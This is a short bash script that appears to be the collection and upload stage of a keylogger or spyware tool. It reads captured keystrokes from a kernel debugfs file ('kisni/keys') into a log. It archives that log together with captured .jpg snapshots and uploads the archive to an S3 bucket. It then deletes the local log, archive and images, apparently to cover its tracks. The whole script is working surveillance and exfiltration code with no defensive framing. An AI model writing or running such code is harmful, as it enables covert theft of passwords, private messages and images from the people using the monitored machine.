#!/bin/bash
fl='/opt/kdesni/sni.log'
echo "" >> $fl
echo "" >> $fl
echo "-------------------------------------------------------------------" >> $fl
dt=`date`
echo $dt >> $fl
cat /sys/kernel/debug/kisni/keys >> $fl
echo "-------------------------------------------------------------------" >> $fl
#
#
dt=$(date +%Y%m%d_%H%M%S)
7z a /tmp/$dt.zip /opt/kdesni/sni.log /opt/kdesni/snap
aws s3 cp /tmp/$dt.zip s3://temp-av/$dt.zip --profile tempav
rm /tmp/$dt.zip
rm /opt/kdesni/sni.log
rm /opt/kdesni/snap/*.jpg
